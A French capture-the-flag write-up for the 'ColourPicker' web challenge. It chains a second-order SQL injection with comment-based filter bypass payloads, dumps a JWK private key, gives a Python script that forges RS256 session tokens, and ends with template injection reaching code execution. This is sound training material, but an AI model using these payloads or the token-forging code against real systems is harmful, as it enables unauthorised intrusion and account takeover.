# ColourPicker

**Auteur :** [Mika](https://x.com/bWlrYQ) 
**Énoncé :**  
![ColourPicker](https://media1.tenor.com/m/cXXIop9N2VAAAAAd/color-pallete.gif)

J'ai créé une appli qui vous permet de choisir une couleur personnalisée pour le front-end, c'est toujours en beta mais n'hésitez pas à jouer avec, de toute façon j'ai fait attention à la sécurité.
**Difficulé :** Moyen
**Code Source :** Non

> Résumé : Ce challenge consistait en l'exploitation d'une injection SQL du 2nd ordre permettant ensuite de forger son propre token JWT et d'exploiter une SSTI.

## Résolution

En jouant un peu avec les différents champs à l'inscription, on identifie une liste bloquante sur certains caractères ou mots dans le nom de l'utilisateur. Cette piste nous oriente sur un potentiel risque d'injection. A l'aide de tests plus ou moins exhaustifs, on identifie la liste suivante :

```python
[" ", '"', "<", ">", "script", "=", ";", "-", "--", "/**/"]
```

En orientant nos recherches vers une injection SQL, on peut bypasser les filtres et encoder nos espaces à l'aide d'un commentaire multiligne: `/*_*/`.
Les quotes simples `'` sont les seules autorisées, et les débuts de commentaires `/*` également.

On essaie donc de s'inscrire avec le payload `'/*_*/UNION/*_*/SELECT/*_*/5*5/*`.
On identifie ainsi une [Second Order SQL injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order), réflété dans le footer de la page une fois connecté.

On peut ensuite utiliser une méthodologie classique d'exploitation d'injection SQL pour exfiltrer le SGBD et les données de la base (cf [solve.py](solve.py)).

Cette exfiltration nous permet de récupérer une clé RSA au format JWK. Compte tenu du cookie de session, il semblerai que cette clé soit utilisée pour signer le JWT de session.

```sql
INSERT INTO jwt_keys (kid, kty, p, q, d, e,n ,qi, dp, dq) VALUES (
    'default',
    'RSA',
    '9CgncwPxNHq5UrfwoOehxxS9KP2cGHIOHBNdhQ1_JstaMRCXiTQSmGdCWBRKpgVTlVuC-BnTnfv8_iAsMWQ62w',
    '0jmpPEaBvRWdGnMA3Ze8LRy7BRgp1EZ9arE3eet-9mWdIjlLQkbRq_s4W_B701XCvog3R4AYJicZBD6pMwX8OQ',
    'RDt9YficFR77ffWSe2pUoASMpj385D9G7ZACsw4cArrZZmeuvAhkPFZIhGBSqp_BJSLSKn5gDLevvxYMJ1B_a0YrGbdSl5KnkQA4Bqy5bQplgbseKrc1dUZ99OTH6pRVfCX3r_jYRVlz95FJFWe_tPrN6GZi_UJG4mhikCztTlE',
    'AQAB',
    'yH_utSCKoawZ0GCbMpgWbruhrjxvReqGshuS5lUW1wVcofKs4e2pKenD0MPatNtHQYGR-_0i_KJDIkKiV2cvydM4Fx7LWU3Q-rN49b_sw4XqjuE2v5HuAUIwF4wBCBR90ZcIEZv_SMprjxGNFnbX5h0CuKIlj8VVGsx9t3CHrsM',
    'und1FyMS6r8Alb9SFTCkmy_yzGOrhPU2tcG0HtsZpuNwZTzb5w5SyIQi1HtX7iPimDXXTtusLuUxTKIDlmO5qg',
    'mkDoM40xDePfQ_h8KVxOZFWg8M3RmcwtR-WgNxiA1cSyFb-SzZc9jFXon3cqdlt1JC6tvwuqG-0BOJig8w-M8w',
    'xvJkkzNScmPy8mXlas---J5Y6uBMLaSr6f1eN9ZCp-HQC-RWsZkdsfkkA_YY6Q4fJ3r3fYXe1LRpe1flffDrGQ'
);
```

Une [conversion au format PEM](https://8gwifi.org/jwkconvertfunctions.jsp) peut être necessaire pour forger un jeton. On peut définir le script suivant pour générer un jeton avec nue couleur arbitraire :

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

def jwk_to_pem(
    p: str, q: str, d: str, e: str, n: str, qi: str, dp: str, dq: str
) -> str:
    """Convert a RSA key from JWK format to PEM"""

    def b64_to_int(value: str) -> int:
        """Convert Base64 encoded value to Int"""
        return int.from_bytes(urlsafe_b64decode(value + "=="), "big")

    # Construct the RSA private key
    private_key = rsa.RSAPrivateNumbers(
        p=b64_to_int(p),
        q=b64_to_int(q),
        d=b64_to_int(d),
        dmp1=b64_to_int(dp),
        dmq1=b64_to_int(dq),
        iqmp=b64_to_int(qi),
        public_numbers=rsa.RSAPublicNumbers(e=b64_to_int(e), n=b64_to_int(n)),
    ).private_key()

    # Serialize the private key to PEM format
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    return pem.decode("utf-8")


def generate_jwt(payload: str, private_key: str) -> str:
    """Generate a valid JWT based on a given payload an private key"""
    now = int(time.time())
    json = {
        "user_id": 1,
        "colour": payload,
        "iat": now,
        "exp": now + 60 * 60 * 2,
    }
    # Encode the JWT
    token = jwt.encode(
        json,
        private_key,
        algorithm="RS256",
        headers={"kid": "default"},
    )
    return token
```

Les tests avec différentes couleurs semble fonctionner.
On peut maintenant essayer d'injecter dans les champs du jeton.

Compte tenu des technologies utilisées sur l'application, on oriente nos recherches sur une [SSTI](https://portswigger.net/web-security/server-side-template-injection), qui s'avère fructueuse. En définissant la couleur `{{7*7}}` dans le champ `colour` on obtient `49` dans le corp du document.

On peut enfin utiliser une méthodologie classique d'exploitation SSTI pour gagner une execution de code sur le serveur (cf [solve.py](solve.py)). Cette exploitation se fera a l'aide du gadget `subprocess.Popen()`.